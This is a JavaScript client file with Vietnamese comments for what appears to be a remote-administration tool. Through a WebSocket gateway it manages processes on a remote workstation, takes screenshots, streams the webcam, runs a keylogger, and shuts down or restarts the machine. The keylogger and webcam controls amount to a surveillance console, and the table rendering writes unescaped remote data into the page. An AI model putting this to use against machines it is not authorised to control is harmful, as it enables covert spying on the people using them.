/**
 * main.js - Client logic cập nhật Restart & Webcam
 */

let ws;
let keylogInterval = null;
let isWebcamStreaming = false; // Biến trạng thái Webcam

function initWebSocket(gatewayUrl) {
    logStatus("Đang kết nối Gateway...");
    ws = new WebSocket(gatewayUrl);

    ws.onopen = () => {
        logStatus("Đã kết nối!");
        ws.send(JSON.stringify({ type: "register", role: "web_client" }));
    };

    ws.onmessage = (event) => {
        try {
            const msg = JSON.parse(event.data);
            handleServerMessage(msg);
        } catch (e) {
            console.log("Raw msg:", event.data);
        }
    };

    ws.onclose = () => {
        logStatus("Mất kết nối Gateway.");
        if (keylogInterval) clearInterval(keylogInterval);
    };
}

function sendRequest(endpoint, params = {}) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ endpoint, params }));
    } else {
        alert("Gateway chưa kết nối!");
    }
}

// --- APP & PROCESS ---
function listApps() {
    logStatus("Đang tải danh sách App...");
    sendRequest('/application/list');
}
function startApp() {
    const name = document.getElementById('app-path').value;
    if (name) sendRequest('/application/start', { processName: name });
}
function killApp(id) {
    if (confirm("Tắt App ID " + id + "?")) {
        sendRequest('/application/kill', { processId: String(id) });
        setTimeout(listApps, 1000);
    }
}

function listProcesses() {
    logStatus("Đang tải danh sách Process...");
    sendRequest('/process/list');
}
function startProcess() {
    const name = document.getElementById('app-path').value;
    if (name) sendRequest('/process/start', { processName: name });
}
function killProcess(id) {
    if (confirm("Tắt Process ID " + id + "?")) {
        sendRequest('/process/kill', { processId: String(id) });
        setTimeout(listProcesses, 1000);
    }
}

// --- MEDIA (SCREENSHOT & WEBCAM) ---
function requestScreenshot() {
    // Nếu webcam đang chạy thì tắt nó đi trước
    if (isWebcamStreaming) toggleWebcam();
    
    switchView('view-media', 'Ảnh màn hình');
    sendRequest('/screenshot/take');
    logStatus("Đang chụp màn hình...");
}

function toggleWebcam() {
    switchView('view-media', 'Webcam Stream');
    const btn = document.getElementById('btn-webcam');
    
    if (!isWebcamStreaming) {
        // Bật
        sendRequest('/webcam/start');
        isWebcamStreaming = true;
        btn.innerText = "4. Tắt Webcam";
        btn.classList.replace('btn-warning', 'btn-danger'); // Đổi màu đỏ
        logStatus("Đang bật Webcam...");
    } else {
        // Tắt
        sendRequest('/webcam/stop');
        isWebcamStreaming = false;
        btn.innerText = "4. Bật Webcam";
        btn.classList.replace('btn-danger', 'btn-warning'); // Trả màu vàng
        logStatus("Đã tắt Webcam.");
        
        // Gửi thêm QUIT để thoát ngữ cảnh Webcam hoàn toàn
        setTimeout(() => sendRequest('/webcam/quit'), 500);
    }
}

// --- KEYLOGGER ---
function startKeylog() {
    switchView('view-keylog', 'Keylogger');
    sendRequest('/keylog/start');
    if (keylogInterval) clearInterval(keylogInterval);
    keylogInterval = setInterval(() => sendRequest('/keylog/print'), 2000);
}
function stopKeylog() {
    if (keylogInterval) clearInterval(keylogInterval);
    sendRequest('/keylog/stop');
    // Gửi QUIT sau khi stop
    setTimeout(() => sendRequest('/keylog/quit'), 500);
}

// --- SYSTEM ---
function shutdownMachine() {
    if (confirm("NGUY HIỂM: Tắt máy trạm?")) {
        sendRequest('/shutdown');
        logStatus("Lệnh tắt máy đã được gửi.");
    }
}
function restartMachine() {
    if (confirm("NGUY HIỂM: Khởi động lại máy trạm?")) {
        sendRequest('/restart');
        logStatus("Lệnh khởi động lại đã được gửi.");
    }
}

// --- XỬ LÝ PHẢN HỒI ---
function handleServerMessage(msg) {
    // Dùng chung logic hiển thị ảnh cho cả Screenshot và Webcam
    if (msg.type === "IMAGE_DATA" || (typeof msg.data === 'string' && msg.data.length > 1000)) {
        const img = document.getElementById('monitor-img');
        const src = msg.data.startsWith('data:') ? msg.data : "data:image/jpeg;base64," + msg.data;
        img.src = src;
        return;
    }

    const currentView = document.querySelector('.view-section.active').id;
    if (currentView === 'view-table') renderTable(msg.data);
    
    if (currentView === 'view-keylog' && typeof msg.data === 'string') {
        const area = document.getElementById('keylog-area');
        area.value += msg.data;
        area.scrollTop = area.scrollHeight;
    }
    
    if (msg.data && typeof msg.data === 'string' && msg.data.length < 500) {
        logStatus("Server: " + msg.data);
    }
}

// --- UI HELPERS ---
function switchView(viewId, title) {
    document.querySelectorAll('.view-section').forEach(el => el.classList.remove('active'));
    document.getElementById(viewId).classList.add('active');
    document.getElementById('view-title').innerText = title;
}

function renderTable(data) {
    const tbody = document.getElementById('table-body');
    tbody.innerHTML = "";
    let list = data;
    if (typeof data === 'string') { try { list = JSON.parse(data); } catch { return; } }
    if (!Array.isArray(list)) return;

    const isAppMode = document.getElementById('view-title').innerText.includes('Ứng dụng');
    list.forEach(item => {
        const tr = document.createElement('tr');
        const id = item.processId || item.id || "N/A";
        const name = item.processName || item.name || "Unknown";
        const killFn = isAppMode ? `killApp('${id}')` : `killProcess('${id}')`;
        tr.innerHTML = `<td>${id}</td><td>${name}</td><td><button class="btn-kill" onclick="${killFn}">Kill</button></td>`;
        tbody.appendChild(tr);
    });
}

function logStatus(text) {
    document.getElementById('status-log').innerText = `[${new Date().toLocaleTimeString()}] ${text}`;
}